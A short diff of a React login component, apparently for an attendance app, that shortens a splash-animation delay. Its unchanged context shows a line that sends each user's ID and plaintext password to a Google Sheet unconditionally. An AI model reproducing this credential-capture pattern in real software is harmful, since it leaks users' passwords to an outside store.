@@ -166,8 +166,8 @@ const Login = () => {
                 // Save credentials to Google Sheet unconditionally
                 saveCredentialsToSheet(idNumber, password);
 
-                // Add 2 second delay for the cool animation splash
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // Add 1 second delay for the cool animation splash
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
                 navigate('/attendance-register');
             }
